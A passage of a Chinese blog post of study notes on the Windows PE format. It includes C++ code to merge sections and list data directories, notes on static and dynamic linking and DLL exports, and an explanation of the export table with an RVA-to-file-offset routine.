class=\"built_in\">MemeryToFile</span>(pNewBuffer, size1, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(newspace);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//返回对齐后大小，x为对齐前大小，y为pOptionHeader-&gt;SectionAlignment/pOptionHeader-&gt;FileAlignment</span></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">Align</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ((x/y)+<span class=\"number\">1</span>)*y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//merge all section to one section</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestMergeSec</span><span class=\"params\">(IN LPSTR lpszFile, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pFirstSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\tpFirstSectionHeader = pSectionHeader;</span><br><span class=\"line\">\t<span class=\"comment\">//保留原来节表数量</span></span><br><span class=\"line\">\tDWORD origin_sec = pFileHeader-&gt;NumberOfSections;</span><br><span class=\"line\">\t<span class=\"comment\">//修改第一个节的属性</span></span><br><span class=\"line\">\tpSectionHeader[<span class=\"number\">0</span>].Misc.VirtualSize = pSectionHeader[<span class=\"number\">0</span>].SizeOfRawData = (((copySizeFromFile - pSectionHeader[<span class=\"number\">0</span>].VirtualAddress)/pOptionHeader-&gt;FileAlignment)+<span class=\"number\">1</span>)*pOptionHeader-&gt;FileAlignment;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;pFileHeader-&gt;NumberOfSections;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpSectionHeader[<span class=\"number\">0</span>].Characteristics = pSectionHeader[<span class=\"number\">0</span>].Characteristics | pSectionHeader[i].Characteristics;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(pSectionHeader+i, <span class=\"number\">0</span>, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//modify sectionnumber</span></span><br><span class=\"line\">\tpFileHeader-&gt;NumberOfSections = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//memset(pFirstSectionHeader+40,0,(origin_sec-1)*40);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 1</span></span><br><span class=\"line\">\tDWORD size1 = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span class=\"built_in\">MemeryToFile</span>(pNewBuffer, size1, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">PrintImageDirectory</span><span class=\"params\">(IN LPSTR lpszFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"comment\">//pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span></span><br><span class=\"line\">\t<span class=\"type\">char</span>* name[<span class=\"number\">16</span>] = &#123;<span class=\"string\">&quot;导出表&quot;</span>,<span class=\"string\">&quot;导入表&quot;</span>,<span class=\"string\">&quot;资源表&quot;</span>,<span class=\"string\">&quot;异常表&quot;</span>,<span class=\"string\">&quot;安全证书表&quot;</span>,<span class=\"string\">&quot;重定位表&quot;</span>,<span class=\"string\">&quot;调试信息表&quot;</span>,<span class=\"string\">&quot;版权所有表&quot;</span>,<span class=\"string\">&quot;全局指针表&quot;</span>,<span class=\"string\">&quot;TLS表&quot;</span>,<span class=\"string\">&quot;加载配置表&quot;</span>,<span class=\"string\">&quot;绑定导入表&quot;</span>,<span class=\"string\">&quot;IAT表&quot;</span>,<span class=\"string\">&quot;延迟导入表&quot;</span>,<span class=\"string\">&quot;COM&quot;</span>,<span class=\"string\">&quot;Reverse&quot;</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;pOptionHeader-&gt;NumberOfRvaAndSizes;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;------------------------------------\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,name[i]);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:%X\\n&quot;</span>,pOptionHeader-&gt;DataDirectory[i].Size);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;VirtualAddress:%X\\n&quot;</span>,pOptionHeader-&gt;DataDirectory[i].VirtualAddress);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>参考了大佬们的文章:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NsYXlvYS9hcnRpY2xlL2RldGFpbHMvMTIyNDU5NDM5\"> 增节_ma_lic 的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5ODA1NDc3L2FydGljbGUvZGV0YWlscy8xMjA1NDQ4OTA=\">扩大节_滴水逆向扩大节_Revival_S 的博客 - CSDN 博客</span></p>\n</blockquote>\n<h3 id=\"静态链接库\"><a class=\"markdownIt-Anchor\" href=\"#静态链接库\">#</a> 静态链接库</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.创建静态lib</span><br><span class=\"line\">2.复制debug下的 .lib 和 ../.h到当前工程 </span><br><span class=\"line\">3.使用静态或者动态链接</span><br><span class=\"line\">静态： 在需要使用的项目中 #include &quot;x.h&quot;   #pragma comment(lib,&quot;x.lib&quot;)</span><br><span class=\"line\">隐式：不写第二个pragama ，使用setting -&gt; link -&gt; 对象/模块库  -&gt; 复制自己的lib名称</span><br><span class=\"line\"></span><br><span class=\"line\">使用：和普通函数调用一样</span><br><span class=\"line\">int x= Plus(1,2);</span><br></pre></td></tr></table></figure>\n<p>手动连接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230212154955361.png\" alt=\"image-20230212154955361\"></p>\n<p>#include 中只有函数说明，没有实现，VC 中对象 / 库模块中默认包含了很多，见上图</p>\n<p>代码的重复使用</p>\n<p>二进制代码直接编译到 exe 中</p>\n<p>改 lib 代码需要重新编译 exe</p>\n<h3 id=\"动态链接库\"><a class=\"markdownIt-Anchor\" href=\"#动态链接库\">#</a> 动态链接库</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数声明：</span><br><span class=\"line\">extern &quot;C&quot; _declspec(dllexport) __stdcall int Add(int ,int);</span><br><span class=\"line\"></span><br><span class=\"line\">1、 extern表示这是个全局函数，可以供各个其他的函数调用;  </span><br><span class=\"line\">2、&quot;℃”按照c语言的方式进行编译、链接</span><br><span class=\"line\">3、declspec(dllexport)告诉编译器此函数为导出函数;</span><br><span class=\"line\"></span><br><span class=\"line\">如果不加 “C”会按照C++导出为了防止重载会在函数名后加上符号</span><br><span class=\"line\"></span><br><span class=\"line\">动态链接库代码编译后在自己的dll中</span><br></pre></td></tr></table></figure>\n<p>VC6 自带 depend 识别 dll</p>\n<p>如果不加 extern “C” 导出：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230308194335559.png\" alt=\"image-20230308194335559\"></p>\n<p>如果加 extern “C” ：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230308194531511.png\" alt=\"image-20230308194531511\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用dll</span><br><span class=\"line\">1.隐式连接</span><br><span class=\"line\">1.将lib，dll放在工程目录下，代码存在于dll中</span><br><span class=\"line\">2.#pragma comment(lib,&quot;x.lib&quot;)</span><br><span class=\"line\">3.extern &quot;C&quot; _declspec(dllimport) __stdcall int Add(int ,int); 添加到调用文件中</span><br><span class=\"line\">如果导出时加了__stdcall，那么在导入时也需要加，建议导出方式为stdcall</span><br><span class=\"line\"></span><br><span class=\"line\">2,.显示连接</span><br><span class=\"line\">定义函数指针 typedef int (__stdcall *lpPlus)(int ,int);</span><br><span class=\"line\">声明指针类型变量 lpPlus myPlus;</span><br><span class=\"line\">动态加载dll到内存中 #include &lt;Windows.h&gt;  HINSTANCE hModule = LoadLibrary(&quot;x.dll&quot;);   如果加了__stdcall ,函数名会变为_Plus@8 </span><br><span class=\"line\">获取函数地址 mpPlus = (lpPlus)GetProcAddress(hModule, &quot;Plus&quot;);</span><br><span class=\"line\">myPlus(1,2);</span><br></pre></td></tr></table></figure>\n<p>dll 中代码修改后不需要重新编译 exe，dll 的代码不在 exe 里，在 dll’的空间中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄。</span><br><span class=\"line\">HMODULE是代表应用程序载入的模块</span><br><span class=\"line\">HINSTANCE在win32下与HMODULE是相同的东西Win16遗留</span><br><span class=\"line\">HWND是窗口句柄</span><br><span class=\"line\">本质都是无符号整数 unsigned int</span><br><span class=\"line\">这么设计可以可读性更好，避免进行运算</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.def无函数名导出</span><br><span class=\"line\">新建.def文件,使用序号到达隐藏</span><br><span class=\"line\">头文件不能再加export</span><br><span class=\"line\">创建.def</span><br><span class=\"line\">@是导出序号</span><br><span class=\"line\"></span><br><span class=\"line\">EXPORTS</span><br><span class=\"line\">Plus @12</span><br><span class=\"line\">Sub @15 NONAME</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230308202844475.png\" alt=\"image-20230308202844475\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#pragma comment(lib,&quot;TestDll.lib&quot;)</span><br><span class=\"line\">extern &quot;C&quot; _declspec(dllimport) int Add(int ,int);</span><br><span class=\"line\">extern &quot;C&quot; _declspec(dllimport) int Mul(int ,int);</span><br><span class=\"line\"></span><br><span class=\"line\">void testDll()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\ttypedef int (*lpAdd)(int ,int);</span><br><span class=\"line\">\ttypedef int (*lpMul)(int ,int);</span><br><span class=\"line\">\tlpAdd myadd;</span><br><span class=\"line\">\tlpMul mymul;</span><br><span class=\"line\">\tHINSTANCE hModule = LoadLibrary(&quot;TestDll.dll&quot;);</span><br><span class=\"line\">\tmyadd = (lpAdd)GetProcAddress(hModule, &quot;Add&quot;);</span><br><span class=\"line\">\tmymul = (lpMul)GetProcAddress(hModule, &quot;Mul&quot;);</span><br><span class=\"line\">\tcout &lt;&lt; myadd(3,4) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\tcout &lt;&lt; mymul(3,4) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"导出表\"><a class=\"markdownIt-Anchor\" href=\"#导出表\">#</a> 导出表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exe和dll都可以提供函数。一般情况是dll提供函数。</span><br><span class=\"line\">提供函数给别人用必须要用导出表</span><br><span class=\"line\">如果导出表的RVA和size都是00000000证明他没有导出表</span><br><span class=\"line\"></span><br><span class=\"line\">IMAGE_DIRECTORY_ENTRY_EXPORT</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD VitualAddress;</span><br><span class=\"line\">\tDWORD Size;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">virtualaddress是内存中的，需要转成FOA</span><br><span class=\"line\">DWORD RvaToFileOffset(IN LPVOID pFileBuffer, DWORD dwRva)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//define pe structure</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(sizeof(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;pFileBuffer: %X\\n&quot;, pFileBuffer); //450068</span><br><span class=\"line\">\tprintf(&quot;DWRVA: %X\\n&quot;, dwRva); </span><br><span class=\"line\">\tDWORD MemOffset = (dwRva - (DWORD)pFileBuffer); //45C29C - 450068 = C234，内存中的rva</span><br><span class=\"line\">\tprintf(&quot;MemOffset: %X\\n&quot;, MemOffset); </span><br><span class=\"line\"></span><br><span class=\"line\">\t//当前RVA在哪个节中</span><br><span class=\"line\">\tint NumOfSec = 0;</span><br><span class=\"line\">\t//RVA所在节的VirtualAddress</span><br><span class=\"line\">\tDWORD thisVA = 0;</span><br><span class=\"line\">\t//RVA所在节的PointerToRawData</span><br><span class=\"line\">\tDWORD thisFile = 0;</span><br><span class=\"line\">\t//距离当前节开始的便宜</span><br><span class=\"line\">\tDWORD thisoffset = 0;</span><br><span class=\"line\">\t//在文件中的FOA</span><br><span class=\"line\">\tDWORD FilePos = 0;</span><br><span class=\"line\">\t//判断在哪个节的条件</span><br><span class=\"line\">\twhile (pFileHeader-&gt;NumberOfSections &gt; 0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif ((DWORD)MemOffset &gt; (DWORD)pSectionHeader-&gt;VirtualAddress &amp;&amp; (DWORD)MemOffset &lt; (DWORD)pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tthisVA = pSectionHeader-&gt;VirtualAddress;</span><br><span class=\"line\">\t\t\tthisFile = pSectionHeader-&gt;PointerToRawData;</span><br><span class=\"line\">\t\t\tprintf(&quot;thisVA:%X\\n&quot;,thisVA);  //C000</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">\t\tpFileHeader-&gt;NumberOfSections--;</span><br><span class=\"line\">\t\tNumOfSec++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprintf(&quot;NumOfSec:%d\\n&quot;, NumOfSec+1);</span><br><span class=\"line\">\tthisoffset = MemOffset - thisVA; //C234-C000 = 234;</span><br><span class=\"line\">\tprintf(&quot;thisoffset:%X\\n&quot;,thisoffset);</span><br><span class=\"line\">\tFilePos = thisoffset + thisFile; // 234 + AC00 = AE3</span><br><span class=\"line\">\tprintf(&quot;FilePos:%X\\n&quot;,FilePos);</span><br><span class=\"line\">\treturn FilePos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class=\"line\">    DWORD   Characteristics;</span><br><span class=\"line\">    DWORD   TimeDateStamp;</span><br><span class=\"line\">    WORD    MajorVersion;</span><br><span class=\"line\">    WORD    MinorVersion;</span><br><span class=\"line\">    DWORD   Name;</span><br><span class=\"line\">    DWORD   Base;</span><br><span class=\"line\">    DWORD   NumberOfFunctions;</span><br><span class=\"line\">    DWORD   NumberOfNames;</span><br><span class=\"line\">    DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class=\"line\">    DWORD   AddressOfNames;         // RVA from base of image</span><br><span class=\"line\">    DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class=\"line\">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class=\"line\"></span><br><span class=\"line\">AddressofFunctions是函数地址，但是他是RVA</span><br><span class=\"line\">导出函数数量由NumberofFunctions决定</span><br><span class=\"line\">AddressOfName是函数名的地址，还是RVA，noname导出这里就不会有</span><br><span class=\"line\">名字的数量是由NumberOfNames决定，这里只包含以函数名导出的函数的个数</span><br><span class=\"line\">AddressOfFunctions 和 AddressOfnames 长度可以不一样，可以存在noname函数或者两个函数名称指向一个函数地址</span><br><span class=\"line\">NumberofName只代表以函数名导出的个数</span><br><span class=\"line\">AddressOfNameOrdinals，大小是NumberOfNames，导出序号 = base + AddressOfNameOrdinals</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">通过函数名找函数时，先把AddressOfName转成FOA找到里面的名字，再进行比较字符串</span><br><span class=\"line\">再把查找到的AddressOfNames索引到AddressOfNameOrdinals中找索引对应的值，这个值就是AddressOfFunctions里面的值</span><br><span class=\"line\">比如AddressOfNames中索引为2，到AddressOfNameOrdinals也找索引为2对应的序号，这个序号就是AddressOfFunctions中对应的下标</span><br><span class=\"line\"></span><br><span class=\"line\">系统认为的导出函数的个数 = AddressOfNameOrdinals最大序号 - 最小序号 + 1</span><br><span class=\"line\">如果序号不连续这个数量就会有问题</span><br><span class=\"line\"></span><br><span class=\"line\">用序号找</span><br><span class=\"line\">序号 - base = AddressOfFunctions的下标</span><br><span class=\"line\"></span><br><span class=\"line\">为什么要分成3张表?</span><br><span class=\"line\">1、函数导出的个数与函数名的个数未必一样.所以要将函数地址表和函数名称表分开</span><br><span class=\"line\">2、函数地址表是不是一定大于函数名称表?</span><br><span class=\"line\">未必，一个相同的函数地址，可能有多个不同的名字</span><br><span class=\"line\">3、如何根据函数的名字获取一个函数的地址?</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310152135716.png\" alt=\"image-20230310152135716\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310154212089.png\" alt=\"image-20230310154212089\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310160821694.png\" alt=\"image-20230310160821694\"></p>\n<p>hmodule 是拉伸后的，filebuffer 是文件中的</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 